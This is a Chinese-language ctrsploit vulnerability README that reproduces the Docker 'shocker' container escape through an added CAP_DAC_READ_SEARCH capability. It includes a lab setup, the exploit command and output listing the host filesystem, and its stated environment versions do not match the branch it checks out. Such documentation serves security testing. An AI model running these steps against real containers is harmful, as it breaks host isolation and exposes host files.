---

tags: sploit
author: ssst0n3
spec_version: v0.1.0
version: v0.1.0
changelog:
    - v0.1.0: init

---

# docker CAP_DAC_READ_SEARCH(shocker) 逃逸

[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/shocker/README.md)

## 1. 漏洞介绍

TODO

## 2. 利用场景

利用容器的不安全配置逃逸

## 3. 前提条件

1. 拥有cap_dac_read_search

## 4. 漏洞存在性检查

`ctrsploit checksec shocker`

## 5. 漏洞复现

### 5.1 复现环境

下面以 [ssst0n3/docker_archive:ubuntu-22.04_docker-ce-24.0.7_containerd.io-1.6.27_runc-1.1.11_v0.1.0](https://github.com/ssst0n3/docker_archive/tree/branch_ubuntu-22.04_docker-ce-24.0.7_containerd.io-1.6.27_runc-1.1.11) 作为复现环境。

```
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive
$ git checkout branch_ubuntu-20.04_docker-ce-19.03.15_docker-ce-cli-19.03.15_containerd.io-1.4.3_runc-1.0.0-rc92
$ docker compose -f docker-compose.kvm.yml up -d
$ ssh -p 19315 root@127.0.0.1
root@127.0.0.1's password: root
root@ubuntu:~# docker info
Client:
 Debug Mode: false

Server:
 Containers: 0
  Running: 0
  Paused: 0
  Stopped: 0
 Images: 0
 Server Version: 19.03.15
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 269548fa27e0089a8b8278fc4fc781d7f65a939b
 runc version: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 5.4.0-56-generic
 Operating System: Ubuntu 20.04.1 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 2.43GiB
 Name: ubuntu
 ID: 4X4W:QE26:IMGY:UHI5:QPCY:NDI5:KKFJ:YWUO:RNOC:QJKR:OHOQ:TXVR
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

WARNING: No swap limit support
```

### 5.2 漏洞复现

启动存在不安全配置的容器。

```
root@ubuntu:~# docker run -ti --name poc --cap-add CAP_DAC_READ_SEARCH ubuntu
```

下载 ctrsploit 步骤略，在容器内发起逃逸攻击。

```
root@e33b98bef3c3:/# ctrsploit --colorful checksec shocker
✔  shocker      # Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.

root@e33b98bef3c3:/# ./ctrsploit/bin/release/ctrsploit_linux_amd64 exploit shocker
root@8fe1576e6aef:/proc/self/fd/7# ls -lah
ls: cannot access '..': No such file or directory
total 18M
drwxr-xr-x  20 root root 4.0K Mar 25 03:59 .
d?????????   ? ?    ?       ?            ? ..
drwx------   2 root root 4.0K Dec 20 07:38 .cache
lrwxrwxrwx   1 root root    7 Dec 20 07:29 bin -> usr/bin
drwxr-xr-x   4 root root 4.0K Jan 16 07:17 boot
drwxr-xr-x   4 root root 4.0K Dec 20 07:29 dev
drwxr-xr-x 198 root root  12K Jun  7 01:52 etc
drwxr-xr-x   3 root root 4.0K Dec 20 07:41 home
lrwxrwxrwx   1 root root   33 Dec 20 07:29 initrd.img -> boot/initrd.img-6.5.0-kali3-amd64
lrwxrwxrwx   1 root root   33 Dec 20 07:29 initrd.img.old -> boot/initrd.img-6.5.0-kali3-amd64
...
```
